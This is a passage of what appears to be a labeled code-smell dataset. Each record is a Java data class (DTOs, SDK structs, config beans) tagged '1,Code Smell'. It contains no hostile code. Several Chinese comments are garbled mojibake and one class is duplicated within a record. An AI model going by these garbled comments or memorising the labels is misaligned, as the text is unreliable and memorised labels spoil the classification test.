  @Schema(description=""鍓嶇璇锋眰鐨則ab绫诲瀷"",requiredMode=Schema.RequiredMode.REQUIRED,example=""1"") private Integer tabType;
  @Schema(description=""鍟嗗搧鍒嗙被缂栧彿"",example=""1"") private Long categoryId;
  @Schema(description=""鍒涘缓鏃堕棿"",example=""[2022-07-01 00:00:00, 2022-07-01 23:59:59]"") @DateTimeFormat(pattern=FORMAT_YEAR_MONTH_DAY_HOUR_MINUTE_SECOND) private LocalDateTime[] createTime;
}",1,Code Smell
"/** 
 * The dubbo interface registers additional data to the registry
 * @author provenceee
 * @since 2022-04-11
 */
public class InterfaceData extends InterfaceKey {
  private String serviceName;
  private Integer order;
  private Set<String> protocol;
  private Map<String,String> parameters;
  /** 
 * Constructor
 */
  public InterfaceData(){
  }
  /** 
 * Constructor
 * @param group Group
 * @param version Version
 * @param serviceName This parameter exists from 2.7.11
 * @param order The serial number of the interface and the serial number of the interface are adapted to 2.6.x,2.7.0-2.7.7
 * @param parameters Additional parameters at the interface level
 */
  public InterfaceData(  String group,  String version,  String serviceName,  Integer order,  Map<String,String> parameters){
    super(group,version);
    this.serviceName=serviceName;
    this.order=order;
    this.parameters=CollectionUtils.isEmpty(parameters) ? null : parameters;
  }
  public String getServiceName(){
    return serviceName;
  }
  public void setServiceName(  String serviceName){
    this.serviceName=serviceName;
  }
  public Integer getOrder(){
    return order;
  }
  public void setOrder(  Integer order){
    this.order=order;
  }
  public Set<String> getProtocol(){
    return protocol;
  }
  public void setProtocol(  Set<String> protocol){
    this.protocol=protocol;
  }
  public Map<String,String> getParameters(){
    return parameters;
  }
  public void setParameters(  Map<String,String> parameters){
    this.parameters=parameters;
  }
  @Override public boolean equals(  Object obj){
    return super.equals(obj);
  }
  @Override public int hashCode(){
    return super.hashCode();
  }
}",1,Code Smell
"public static class NET_DVR_INQUEST_CDRW_CFG extends Structure {
  public int dwSize;
  public int dwNum;
  public int[] dwRwSelectPara=new int[MAX_CHANNUM_V30];
  public int dwModeSelect;
  public byte[] byRes=new byte[24];
  public int dwStartCDRW;
  public int dwHdExcp;
  public int dwInterval;
  public byte[] sLable=new byte[64];
}",1,Code Smell
"/** 
 * Definition of the spec according to Apple/Google: https://developer.apple.com/documentation/exposurenotification/enexposureconfiguration
 */
public class ParameterSpec {
  private ParameterSpec(){
  }
  /** 
 * The minimum weight value for mobile API.
 */
  public static final double WEIGHT_MIN=0.001;
  /** 
 * The maximum weight value for mobile API.
 */
  public static final int WEIGHT_MAX=100;
  /** 
 * Maximum number of allowed decimals.
 */
  public static final int WEIGHT_MAX_DECIMALS=3;
  /** 
 * The allowed minimum value for risk score.
 */
  public static final int RISK_SCORE_MIN=0;
  /** 
 * The allowed maximum value for a risk score.
 */
  public static final int RISK_SCORE_MAX=9999;
  /** 
 * The allowed minimum value for an attenuation threshold.
 */
  public static final int ATTENUATION_DURATION_THRESHOLD_MIN=0;
  /** 
 * The allowed maximum value for an attenuation threshold.
 */
  public static final int ATTENUATION_DURATION_THRESHOLD_MAX=100;
  /** 
 * The allowed minimum value for an attenuation weight.
 */
  public static final double ATTENUATION_DURATION_WEIGHT_MIN=.0;
  /** 
 * The allowed maximum value for an attenuation weight.
 */
  public static final double ATTENUATION_DURATION_WEIGHT_MAX=1.;
  /** 
 * Maximum number of allowed decimals for an attenuation weight.
 */
  public static final int ATTENUATION_DURATION_WEIGHT_MAX_DECIMALS=3;
  /** 
 * The allowed minimum value for a default bucket offset.
 */
  public static final int DEFAULT_BUCKET_OFFSET_MIN=0;
  /** 
 * The allowed maximum value for a default bucket offset.
 */
  public static final int DEFAULT_BUCKET_OFFSET_MAX=1;
  /** 
 * The allowed minimum value for a risk score normalization divisor.
 */
  public static final int RISK_SCORE_NORMALIZATION_DIVISOR_MIN=0;
  /** 
 * The allowed maximum value for a risk score normalization divisor.
 */
  public static final int RISK_SCORE_NORMALIZATION_DIVISOR_MAX=1000;
}",1,Code Smell
"public class CfWeixinConfig implements Serializable {
  private String id;
  private String enName;
  private String zhName;
  private String useScenes;
  private String value;
  private String description;
  private Long createTime;
  private Long updateTime;
  private Long expireTime;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getEnName(){
    return enName;
  }
  public void setEnName(  String enName){
    this.enName=enName == null ? null : enName.trim();
  }
  public String getZhName(){
    return zhName;
  }
  public void setZhName(  String zhName){
    this.zhName=zhName == null ? null : zhName.trim();
  }
  public String getUseScenes(){
    return useScenes;
  }
  public void setUseScenes(  String useScenes){
    this.useScenes=useScenes == null ? null : useScenes.trim();
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value == null ? null : value.trim();
  }
  public String getDescription(){
    return description;
  }
  public void setDescription(  String description){
    this.description=description == null ? null : description.trim();
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
  public Long getExpireTime(){
    return expireTime;
  }
  public void setExpireTime(  Long expireTime){
    this.expireTime=expireTime;
  }
}",1,Code Smell
"/** 
 * FeiShuConstants 
 */
public class FeiShuConstants extends AlertBaseConstant {
  public static final String TYPE=""FeiShu"";
  public static final String SIGN_TMESTAMP=""timestamp"";
  public static final String SIGN=""sign"";
  public static final String ALERT_TEMPLATE_TITLE=""title"";
  public static final String ALERT_TEMPLATE_CONTENT=""content"";
  public static final String ALERT_TEMPLATE_KEYWORD=""keyword"";
  public static final String ALERT_TEMPLATE_AT_USERS=""atUsers"";
}
",1,Code Smell
"public static class TopAlarm {
  private Double error;
  private int errorCount;
  private Double warn;
  private int warnCount;
  private Integer alarmLevel;
  private int maxAlarmCount=10;
  public TopAlarm(){
  }
  public Double getError(){
    return error;
  }
  public void setError(  Double error){
    this.error=error;
  }
  public Double getWarn(){
    return warn;
  }
  public void setWarn(  Double warn){
    this.warn=warn;
  }
  public int getErrorCount(){
    return errorCount;
  }
  public void setErrorCount(  int errorCount){
    this.errorCount=errorCount;
  }
  public int getWarnCount(){
    return warnCount;
  }
  public void setWarnCount(  int warnCount){
    this.warnCount=warnCount;
  }
  public Integer getAlarmLevel(){
    return alarmLevel;
  }
  public void setAlarmLevel(  Integer alarmLevel){
    this.alarmLevel=alarmLevel;
  }
  public int getMaxAlarmCount(){
    return maxAlarmCount;
  }
  public void setMaxAlarmCount(  int maxAlarmCount){
    this.maxAlarmCount=maxAlarmCount;
  }
}",1,Code Smell
"/** 
 * @author paras.chawla
 * @version $Id: Revision.java, v 0.1 2020-10-27 10:58 paras.chawla Exp $$
 */
public class Revision {
  Action action;
  CharacterNode node;
  public Revision(  Action action,  CharacterNode node){
    this.action=action;
    this.node=node;
  }
  public Action getAction(){
    return action;
  }
  public void setAction(  Action action){
    this.action=action;
  }
  public CharacterNode getNode(){
    return node;
  }
  public void setNode(  CharacterNode node){
    this.node=node;
  }
  @Override public String toString(){
    return ""Revision{"" + ""action="" + action + "", node=""+ node+ '}';
  }
}
/** 
 * @author paras.chawla
 * @version $Id: Revision.java, v 0.1 2020-10-27 10:58 paras.chawla Exp $$
 */
public class Revision {
  Action action;
  CharacterNode node;
  public Revision(  Action action,  CharacterNode node){
    this.action=action;
    this.node=node;
  }
  public Action getAction(){
    return action;
  }
  public void setAction(  Action action){
    this.action=action;
  }
  public CharacterNode getNode(){
    return node;
  }
  public void setNode(  CharacterNode node){
    this.node=node;
  }
  @Override public String toString(){
    return ""Revision{"" + ""action="" + action + "", node=""+ node+ '}';
  }
}",1,Code Smell
"public static class CFG_DIAGNOSIS_TASK extends SdkStructure {
  public byte[] szTaskName=new byte[MAX_PATH];
  public byte[] szProfileName=new byte[MAX_PATH];
  public int nTotalSourceNum;
  public int nReturnSourceNum;
  public Pointer pstSources;
}
",1,Code Smell
"public static class IMAGE_INFO extends SdkStructure {
  public int nLength;
  public int nWidth;
  public int nHeight;
  public byte[] szFilePath=new byte[260];
  public byte[] byReserved=new byte[512];
}",1,Code Smell
"/** 
 * @author priyamvora
 * @created 23/05/2021
 */
public class Cab {
  private final String cabId;
  private final Driver driver;
  private final Vehicle vehicle;
  private final CabType cabType;
  private CabStatus cabStatus;
  private final Integer capacity;
  public Cab(  String cabId,  Driver driver,  Vehicle vehicle,  CabType cabType,  CabStatus cabStatus,  Integer capacity){
    this.cabId=cabId;
    this.driver=driver;
    this.vehicle=vehicle;
    this.cabType=cabType;
    this.cabStatus=cabStatus;
    this.capacity=capacity;
  }
  public String getCabId(){
    return cabId;
  }
  public Driver getDriver(){
    return driver;
  }
  public Vehicle getVehicle(){
    return vehicle;
  }
  public CabType getCabType(){
    return cabType;
  }
  public CabStatus getCabStatus(){
    return cabStatus;
  }
  public Integer getCapacity(){
    return capacity;
  }
  public void setCabStatus(  CabStatus cabStatus){
    this.cabStatus=cabStatus;
  }
}",1,Code Smell
"/** 
 * SortEvent
 */
public class SortEvent extends ProxyEvent {
  protected String messageKey;
  protected String messageOffset;
  protected long sendTime;
  /** 
 * Constructor
 */
  public SortEvent(){
  }
  /** 
 * Constructor
 * @param inlongGroupId
 * @param inlongStreamId
 * @param body
 * @param msgTime
 * @param sourceIp
 */
  public SortEvent(  String inlongGroupId,  String inlongStreamId,  byte[] body,  long msgTime,  String sourceIp){
    super(inlongGroupId,inlongStreamId,body,msgTime,sourceIp);
  }
  /** 
 * Constructor
 * @param inlongGroupId
 * @param inlongStreamId
 * @param obj
 */
  public SortEvent(  String inlongGroupId,  String inlongStreamId,  MessageObj obj){
    super(inlongGroupId,inlongStreamId,obj);
  }
  /** 
 * get messageKey
 * @return the messageKey
 */
  public String getMessageKey(){
    return messageKey;
  }
  /** 
 * set messageKey
 * @param messageKey the messageKey to set
 */
  public void setMessageKey(  String messageKey){
    this.messageKey=messageKey;
  }
  /** 
 * get messageOffset
 * @return the messageOffset
 */
  public String getMessageOffset(){
    return messageOffset;
  }
  /** 
 * set messageOffset
 * @param messageOffset the messageOffset to set
 */
  public void setMessageOffset(  String messageOffset){
    this.messageOffset=messageOffset;
  }
  /** 
 * get sendTime
 * @return the sendTime
 */
  public long getSendTime(){
    return sendTime;
  }
  /** 
 * set sendTime
 * @param sendTime the sendTime to set
 */
  public void setSendTime(  long sendTime){
    this.sendTime=sendTime;
  }
}
",1,Code Smell
"@JsonInclude(Include.NON_NULL) public static class PrivatePermissionRoleItem implements Serializable {
  public static final long serialVersionUID=1L;
  private String bid;
  private String roleId;
  private String roleName;
  private String roleType;
  private Date gmtModified;
  private String owner;
  private String ownerName;
  private String ownerType;
  private String description;
  private Date gmtExpired;
  public String getBid(){
    return bid;
  }
  public void setBid(  String bid){
    this.bid=bid;
  }
  public String getRoleId(){
    return roleId;
  }
  public void setRoleId(  String roleId){
    this.roleId=roleId;
  }
  public String getRoleName(){
    return roleName;
  }
  public void setRoleName(  String roleName){
    this.roleName=roleName;
  }
  public String getRoleType(){
    return roleType;
  }
  public void setRoleType(  String roleType){
    this.roleType=roleType;
  }
  public Date getGmtModified(){
    return gmtModified;
  }
  public void setGmtModified(  Date gmtModified){
    this.gmtModified=gmtModified;
  }
  public String getOwner(){
    return owner;
  }
  public void setOwner(  String owner){
    this.owner=owner;
  }
  public String getOwnerName(){
    return ownerName;
  }
  public void setOwnerName(  String ownerName){
    this.ownerName=ownerName;
  }
  public String getOwnerType(){
    return ownerType;
  }
  public void setOwnerType(  String ownerType){
    this.ownerType=ownerType;
  }
  public String getDescription(){
    return description;
  }
  public void setDescription(  String description){
    this.description=description;
  }
  public Date getGmtExpired(){
    return gmtExpired;
  }
  public void setGmtExpired(  Date gmtExpired){
    this.gmtExpired=gmtExpired;
  }
}",1,Code Smell
"public static class TestPortableOptionsImpl implements TestPortableOptions {
  private String name;
  private Integer age;
  private String nonInterfaceField;
  @Override public String getName(){
    return name;
  }
  @Override public void setName(  String name){
    this.name=name;
  }
  @Override public Integer getAge(){
    return age;
  }
  @Override public void setAge(  Integer age){
    this.age=age;
  }
  public String getNonInterfaceField(){
    return nonInterfaceField;
  }
  public void setNonInterfaceField(  String nonInterfaceField){
    this.nonInterfaceField=nonInterfaceField;
  }
}
",1,Code Smell
"/** 
 * 鍒嗗尯鎿嶄綔鎻忚堪
 * @author jiangbo
 */
public class PartCondition {
  /** 
 * 鍒嗗尯瀛楁
 */
  private String key;
  /** 
 * 瀛楁鍊�
 */
  private String value;
  /** 
 * 鎿嶄綔
 */
  private String operate;
  public PartCondition(  String key,  String operate,  String value){
    this.key=key;
    this.value=value;
    this.operate=operate;
  }
  public String getKey(){
    return key;
  }
  public void setKey(  String key){
    this.key=key;
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value;
  }
  public String getOperate(){
    return operate;
  }
  public void setOperate(  String operate){
    this.operate=operate;
  }
  @Override public String toString(){
    return ""PartCondition{"" + ""key='"" + key + '\''+ "", value='""+ value+ '\''+ "", operate='""+ operate+ '\''+ '}';
  }
}
",1,Code Smell
"/** 
 * 璁惧鍝佺墝
 * @ClassName DeviceBrand
 * @Author 闅斿灏忕帇瀛 981011512@qq.com
 * @Date 2022/12/3/003 16:37
 * @Version 1.0
 */
public class DeviceBrand implements Serializable {
  public static final String ZHEN_SHI=""zhen_shi"";
  public static final String HUA_XIA=""hua_xia"";
  public static final String QIAN_YI=""qian_yi"";
  public static final String HK=""hk"";
  public static final String DH=""dh"";
}",1,Code Smell
"private static class Particle {
  public final int type;
  public final int color;
  public final float scale;
  public final float angle;
  public final float x;
  public final float y;
  public Particle(  int type,  int color,  float x,  float y,  float scale,  float angle){
    this.type=type;
    this.color=color;
    this.x=x;
    this.y=y;
    this.scale=scale;
    this.angle=angle;
  }
}
private static class Particle {
  float x;
  float y;
  float vx;
  float vy;
  float velocity;
  float alpha;
  float lifeTime;
  float currentTime;
}
",1,Code Smell
"/** 
 * @author Jingzhou Ou
 */
@ConfigurationProperties(Neo4jVectorStoreProperties.CONFIG_PREFIX) public class Neo4jVectorStoreProperties {
  public static final String CONFIG_PREFIX=""spring.ai.vectorstore.neo4j"";
  private String databaseName;
  private int embeddingDimension=Neo4jVectorStore.DEFAULT_EMBEDDING_DIMENSION;
  private Neo4jVectorStore.Neo4jDistanceType distanceType=Neo4jVectorStore.Neo4jDistanceType.COSINE;
  private String label=Neo4jVectorStore.DEFAULT_LABEL;
  private String embeddingProperty=Neo4jVectorStore.DEFAULT_EMBEDDING_PROPERTY;
  private String indexName=Neo4jVectorStore.DEFAULT_INDEX_NAME;
  private String idProperty=Neo4jVectorStore.DEFAULT_ID_PROPERTY;
  private String constraintName=Neo4jVectorStore.DEFAULT_CONSTRAINT_NAME;
  public String getDatabaseName(){
    return this.databaseName;
  }
  public void setDatabaseName(  String databaseName){
    this.databaseName=databaseName;
  }
  public int getEmbeddingDimension(){
    return this.embeddingDimension;
  }
  public void setEmbeddingDimension(  int embeddingDimension){
    this.embeddingDimension=embeddingDimension;
  }
  public Neo4jVectorStore.Neo4jDistanceType getDistanceType(){
    return this.distanceType;
  }
  public void setDistanceType(  Neo4jVectorStore.Neo4jDistanceType distanceType){
    this.distanceType=distanceType;
  }
  public String getLabel(){
    return this.label;
  }
  public void setLabel(  String label){
    this.label=label;
  }
  public String getEmbeddingProperty(){
    return this.embeddingProperty;
  }
  public void setEmbeddingProperty(  String embeddingProperty){
    this.embeddingProperty=embeddingProperty;
  }
  public String getIndexName(){
    return this.indexName;
  }
  public void setIndexName(  String indexName){
    this.indexName=indexName;
  }
  public String getIdProperty(){
    return this.idProperty;
  }
  public void setIdProperty(  String idProperty){
    this.idProperty=idProperty;
  }
  public String getConstraintName(){
    return this.constraintName;
  }
  public void setConstraintName(  String constraintName){
    this.constraintName=constraintName;
  }
}",1,Code Smell
"/** 
 * Instance information
 * @author zhp
 * @since 2023-02-17
 */
public class InstanceInfo {
  /** 
 * Number of requests
 */
  private AtomicInteger requestNum;
  /** 
 * The number of failed requests
 */
  private AtomicInteger requestFailNum;
  /** 
 * Removal status
 */
  private AtomicBoolean removalStatus;
  /** 
 * Removal time
 */
  private long removalTime;
  /** 
 * Recovery time
 */
  private long recoveryTime;
  /** 
 * IP address and domain name of the instance
 */
  private String host;
  /** 
 * Instance port
 */
  private String port;
  /** 
 * Last call time
 */
  private long lastInvokeTime;
  /** 
 * Service call statistics
 */
  private List<RequestCountData> countDataList;
  /** 
 * Error rate
 */
  private float errorRate;
  /** 
 * Constructor
 */
  public InstanceInfo(){
    this.requestNum=new AtomicInteger(0);
    this.requestFailNum=new AtomicInteger(0);
    this.removalStatus=new AtomicBoolean(false);
  }
  public AtomicInteger getRequestNum(){
    return requestNum;
  }
  public void setRequestNum(  AtomicInteger requestNum){
    this.requestNum=requestNum;
  }
  public AtomicInteger getRequestFailNum(){
    return requestFailNum;
  }
  public void setRequestFailNum(  AtomicInteger requestFailNum){
    this.requestFailNum=requestFailNum;
  }
  public AtomicBoolean getRemovalStatus(){
    return removalStatus;
  }
  public void setRemovalStatus(  AtomicBoolean removalStatus){
    this.removalStatus=removalStatus;
  }
  public String getHost(){
    return host;
  }
  public void setHost(  String host){
    this.host=host;
  }
  public String getPort(){
    return port;
  }
  public void setPort(  String port){
    this.port=port;
  }
  public List<RequestCountData> getCountDataList(){
    return countDataList;
  }
  public void setCountDataList(  List<RequestCountData> countDataList){
    this.countDataList=countDataList;
  }
  public long getRemovalTime(){
    return removalTime;
  }
  public void setRemovalTime(  long removalTime){
    this.removalTime=removalTime;
  }
  public long getLastInvokeTime(){
    return lastInvokeTime;
  }
  public void setLastInvokeTime(  long lastInvokeTime){
    this.lastInvokeTime=lastInvokeTime;
  }
  public long getRecoveryTime(){
    return recoveryTime;
  }
  public void setRecoveryTime(  long recoveryTime){
    this.recoveryTime=recoveryTime;
  }
  public float getErrorRate(){
    return errorRate;
  }
  public void setErrorRate(  float errorRate){
    this.errorRate=errorRate;
  }
  @Override public String toString(){
    return ""InstanceInfo{"" + ""requestNum="" + requestNum + "", requestFailNum=""+ requestFailNum+ "", removalStatus=""+ removalStatus+ "", removalTime=""+ removalTime+ "", recoveryTime=""+ recoveryTime+ "", host='""+ host+ '\''+ "", port='""+ port+ '\''+ "", lastInvokeTime=""+ lastInvokeTime+ "", countDataList=""+ countDataList+ "", errorRate=""+ errorRate+ '}';
  }
}",1,Code Smell
"/** 
 * 鏂伴椈绫诲埆琛
 * @author xiongxy
 * @email 1179705413@qq.com
 * @date 2020-12-01 10:03:41
 */
public class CategoryDO implements Serializable {
  private static final long serialVersionUID=1L;
  private Integer id;
  private String name;
  private Integer sort;
  @JsonSerialize(using=LongToStringSerializer.class) private Long createUserId;
  @DateTimeFormat(pattern=""yyyy-MM-dd HH:mm:ss"") private Date createTime;
  @JsonSerialize(using=LongToStringSerializer.class) private Long updateUserId;
  @DateTimeFormat(pattern=""yyyy-MM-dd HH:mm:ss"") private Date updateTime;
  /** 
 * 璁剧疆锛氫富閿
 */
  public void setId(  Integer id){
    this.id=id;
  }
  /** 
 * 鑾峰彇锛氫富閿
 */
  public Integer getId(){
    return id;
  }
  /** 
 * 璁剧疆锛氬垎绫诲悕
 */
  public void setName(  String name){
    this.name=name;
  }
  /** 
 * 鑾峰彇锛氬垎绫诲悕
 */
  public String getName(){
    return name;
  }
  /** 
 * 璁剧疆锛氭帓搴
 */
  public void setSort(  Integer sort){
    this.sort=sort;
  }
  /** 
 * 鑾峰彇锛氭帓搴
 */
  public Integer getSort(){
    return sort;
  }
  /** 
 * 璁剧疆锛
 */
  public void setCreateUserId(  Long createUserId){
    this.createUserId=createUserId;
  }
  /** 
 * 鑾峰彇锛
 */
  public Long getCreateUserId(){
    return createUserId;
  }
  /** 
 * 璁剧疆锛
 */
  public void setCreateTime(  Date createTime){
    this.createTime=createTime;
  }
  /** 
 * 鑾峰彇锛
 */
  public Date getCreateTime(){
    return createTime;
  }
  /** 
 * 璁剧疆锛
 */
  public void setUpdateUserId(  Long updateUserId){
    this.updateUserId=updateUserId;
  }
  /** 
 * 鑾峰彇锛
 */
  public Long getUpdateUserId(){
    return updateUserId;
  }
  /** 
 * 璁剧疆锛
 */
  public void setUpdateTime(  Date updateTime){
    this.updateTime=updateTime;
  }
  /** 
 * 鑾峰彇锛
 */
  public Date getUpdateTime(){
    return updateTime;
  }
}",1,Code Smell
"public final class GProFeedbackReq {
  GProItemCbData callback;
  String contentType;
  String feedId;
  String feedbackType;
  String scene;
  public GProFeedbackReq(){
    this.scene="""";
    this.feedbackType="""";
    this.feedId="""";
    this.contentType="""";
    this.callback=new GProItemCbData();
  }
  public GProItemCbData getCallback(){
    return this.callback;
  }
  public String getContentType(){
    return this.contentType;
  }
  public String getFeedId(){
    return this.feedId;
  }
  public String getFeedbackType(){
    return this.feedbackType;
  }
  public String getScene(){
    return this.scene;
  }
  public String toString(){
    return ""GProFeedbackReq{scene="" + this.scene + "",feedbackType=""+ this.feedbackType+ "",feedId=""+ this.feedId+ "",contentType=""+ this.contentType+ "",callback=""+ this.callback+ "",}"";
  }
  public GProFeedbackReq(  String str,  String str2,  String str3,  String str4,  GProItemCbData gProItemCbData){
    this.scene="""";
    this.feedbackType="""";
    this.feedId="""";
    this.contentType="""";
    this.callback=new GProItemCbData();
    this.scene=str;
    this.feedbackType=str2;
    this.feedId=str3;
    this.contentType=str4;
    this.callback=gProItemCbData;
  }
}",1,Code Smell
"public class CodeStyleInfo {
  public List<String> project;
  public String fileName;
  public String fileAddr;
  public String md5;
  public boolean enable;
  public boolean autoFormat;
}",1,Code Smell
"/** 
 * Holds information on a frame and how to release it. 
 */
private static final class InputFrameInfo {
  public final GlTextureProducer textureProducer;
  public final GlTextureInfo texture;
  public final long presentationTimeUs;
  public final OverlaySettings overlaySettings;
  public InputFrameInfo(  GlTextureProducer textureProducer,  GlTextureInfo texture,  long presentationTimeUs,  OverlaySettings overlaySettings){
    this.textureProducer=textureProducer;
    this.texture=texture;
    this.presentationTimeUs=presentationTimeUs;
    this.overlaySettings=overlaySettings;
  }
}
",1,Code Smell
"public class RegisterInformationInternal extends RegisterInformation {
  private BigInteger value=BigInteger.ZERO;
  private boolean modified=false;
  public RegisterInformationInternal(  final String registerName,  final int registerSize){
    super(registerName,registerSize);
  }
  public BigInteger getValue(){
    return value;
  }
  public boolean isModified(){
    return modified;
  }
  public void setModified(  final boolean modified){
    this.modified=modified;
  }
  public void setValue(  final BigInteger value){
    this.value=value;
  }
}
",1,Code Smell
"/** 
 * @author godotg
 */
@Protocol(id=1112) public class CM_Float {
  private float a;
  private Float b;
  private double c;
  private Double d;
  @Override public String toString(){
    return ""CM_Float{"" + ""a="" + a + "", b=""+ b+ "", c=""+ c+ "", d=""+ d+ '}';
  }
  public float getA(){
    return a;
  }
  public void setA(  float a){
    this.a=a;
  }
  public Float getB(){
    return b;
  }
  public void setB(  Float b){
    this.b=b;
  }
  public double getC(){
    return c;
  }
  public void setC(  double c){
    this.c=c;
  }
  public Double getD(){
    return d;
  }
  public void setD(  Double d){
    this.d=d;
  }
  @Override public boolean equals(  Object o){
    if (this == o)     return true;
    if (o == null || getClass() != o.getClass())     return false;
    CM_Float cm_float=(CM_Float)o;
    return Float.compare(cm_float.a,a) == 0 && Double.compare(cm_float.c,c) == 0 && Objects.equals(b,cm_float.b) && Objects.equals(d,cm_float.d);
  }
  @Override public int hashCode(){
    return Objects.hash(a,b,c,d);
  }
}",1,Code Smell
"@Entity public class OrderStateHisotry implements Serializable {
  /** 
 */
  private static final long serialVersionUID=8514226969185692360L;
  @Id private String orderCode;
  private String state;
  private Date stateUpdatedTime;
  private boolean monitoringProcessed;
  public OrderStateHisotry(){
    super();
  }
  public OrderStateHisotry(  String orderCode,  String state,  Date stateUpdatedTime){
    super();
    setOrderCode(orderCode);
    setState(state);
    setStateUpdatedTime(stateUpdatedTime);
  }
  public boolean isMonitoringProcessed(){
    return monitoringProcessed;
  }
  public void setMonitoringProcessed(  boolean monitoringProcessed){
    this.monitoringProcessed=monitoringProcessed;
  }
  public String getOrderCode(){
    return orderCode;
  }
  public void setOrderCode(  String orderCode){
    this.orderCode=orderCode.toUpperCase();
  }
  public String getState(){
    return state;
  }
  public void setState(  String state){
    this.state=state.toUpperCase();
  }
  public Date getStateUpdatedTime(){
    return stateUpdatedTime;
  }
  public void setStateUpdatedTime(  Date stateUpdatedTime){
    this.stateUpdatedTime=stateUpdatedTime;
  }
  @Override public int hashCode(){
    final int prime=31;
    int result=1;
    result=prime * result + ((orderCode == null) ? 0 : orderCode.hashCode());
    result=prime * result + ((state == null) ? 0 : state.hashCode());
    return result;
  }
  @Override public boolean equals(  Object obj){
    if (this == obj)     return true;
    if (obj == null)     return false;
    if (getClass() != obj.getClass())     return false;
    OrderStateHisotry other=(OrderStateHisotry)obj;
    if (orderCode == null) {
      if (other.orderCode != null)       return false;
    }
 else     if (!orderCode.equals(other.orderCode))     return false;
    if (state == null) {
      if (other.state != null)       return false;
    }
 else     if (!state.equals(other.state))     return false;
    return true;
  }
  @Override public String toString(){
    return ""OrderStateHisotry [orderCode="" + orderCode + "", state=""+ state+ "", stateUpdatedTime=""+ stateUpdatedTime+ "", monitoringProcessed=""+ monitoringProcessed+ ""]"";
  }
}",1,Code Smell
"/** 
 * Contract Information
 * @author zhp
 * @since 2022-11-30
 */
public class Contract extends BaseInfo {
  /** 
 * The name of the interface
 */
  private String interfaceName;
  /** 
 * The key of the service registration
 */
  private String serviceKey;
  /** 
 * The path of the request
 */
  private String url;
  /** 
 * Service ID
 */
  private String serviceId;
  /** 
 * Method set
 */
  private List<MethodInfo> methodInfoList;
  public String getInterfaceName(){
    return interfaceName;
  }
  public void setInterfaceName(  String interfaceName){
    this.interfaceName=interfaceName;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public List<MethodInfo> getMethodInfoList(){
    return methodInfoList;
  }
  public void setMethodInfoList(  List<MethodInfo> methodInfoList){
    this.methodInfoList=methodInfoList;
  }
  public String getServiceId(){
    return serviceId;
  }
  public void setServiceId(  String serviceId){
    this.serviceId=serviceId;
  }
  public String getServiceKey(){
    return serviceKey;
  }
  public void setServiceKey(  String serviceKey){
    this.serviceKey=serviceKey;
  }
}",1,Code Smell
"public static class NET_SCADA_NOTIFY_POINT_ALARM_INFO extends SdkStructure {
  public int dwSize;
  public byte[] szDevID=new byte[NET_COMMON_STRING_16];
  public byte[] szPointID=new byte[NET_COMMON_STRING_128];
  public int bAlarmFlag;
  public NET_TIME stuAlarmTime;
  public int nAlarmLevel;
  public int nSerialNo;
  public byte[] szAlarmDesc=new byte[NET_COMMON_STRING_128];
  public NET_SCADA_NOTIFY_POINT_ALARM_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * 锟斤拷WarehouseInfo.java锟斤拷实锟斤拷锟斤拷锟斤拷锟斤拷锟街匡拷锟斤拷息锟斤拷锟斤拷
 * @author maik.wangz 2011-12-12 锟斤拷锟斤拷09:50:32
 */
public class WareHouseInfo implements Serializable {
  private static final long serialVersionUID=6102232214244738211L;
  private String provinceId;
  private String provinceName;
  private String cityId;
  private String cityName;
  private String areaId;
  private String areaName;
  private String houseArea;
  private Image[] images;
  public String getProvinceId(){
    return provinceId;
  }
  public void setProvinceId(  String provinceId){
    this.provinceId=provinceId;
  }
  public String getProvinceName(){
    return provinceName;
  }
  public void setProvinceName(  String provinceName){
    this.provinceName=provinceName;
  }
  public String getCityId(){
    return cityId;
  }
  public void setCityId(  String cityId){
    this.cityId=cityId;
  }
  public String getCityName(){
    return cityName;
  }
  public void setCityName(  String cityName){
    this.cityName=cityName;
  }
  public String getAreaId(){
    return areaId;
  }
  public void setAreaId(  String areaId){
    this.areaId=areaId;
  }
  public String getAreaName(){
    return areaName;
  }
  public void setAreaName(  String areaName){
    this.areaName=areaName;
  }
  public String getHouseArea(){
    return houseArea;
  }
  public void setHouseArea(  String houseArea){
    this.houseArea=houseArea;
  }
  public Image[] getImages(){
    return images;
  }
  public void setImages(  Image[] images){
    this.images=images;
  }
}",1,Code Smell
"/** 
 * 琛ㄦ暟鎹
 * @author chenshun
 * @email 1179705413@qq.com
 * @date 2019-09-25 15:09:21
 */
public class TableDO {
  private String tableName;
  private String comments;
  private GenColumnsDO pk;
  private List<GenColumnsDO> columns;
  private String className;
  private String classname;
  public String getTableName(){
    return tableName;
  }
  public void setTableName(  String tableName){
    this.tableName=tableName;
  }
  public String getComments(){
    return comments;
  }
  public void setComments(  String comments){
    this.comments=comments;
  }
  public GenColumnsDO getPk(){
    return pk;
  }
  public void setPk(  GenColumnsDO pk){
    this.pk=pk;
  }
  public List<GenColumnsDO> getColumns(){
    return columns;
  }
  public void setColumns(  List<GenColumnsDO> columns){
    this.columns=columns;
  }
  public String getClassName(){
    return className;
  }
  public void setClassName(  String className){
    this.className=className;
  }
  public String getClassname(){
    return classname;
  }
  public void setClassname(  String classname){
    this.classname=classname;
  }
  @Override public String toString(){
    return ""TableDO{"" + ""tableName='"" + tableName + '\''+ "", comments='""+ comments+ '\''+ "", pk=""+ pk+ "", columns=""+ columns+ "", className='""+ className+ '\''+ "", classname='""+ classname+ '\''+ '}';
  }
}",1,Code Smell
"/** 
 * @Author : LarkMidTable
 * @Date : 2020/9/16 11:14
 * @Description : xxl-job config
 */
@Component public class JobAdminConfig implements InitializingBean, DisposableBean {
  private static JobAdminConfig adminConfig=null;
  public static JobAdminConfig getAdminConfig(){
    return adminConfig;
  }
  private JobScheduler xxlJobScheduler;
  @Override public void afterPropertiesSet() throws Exception {
    adminConfig=this;
    xxlJobScheduler=new JobScheduler();
    xxlJobScheduler.init();
  }
  @Override public void destroy() throws Exception {
    xxlJobScheduler.destroy();
  }
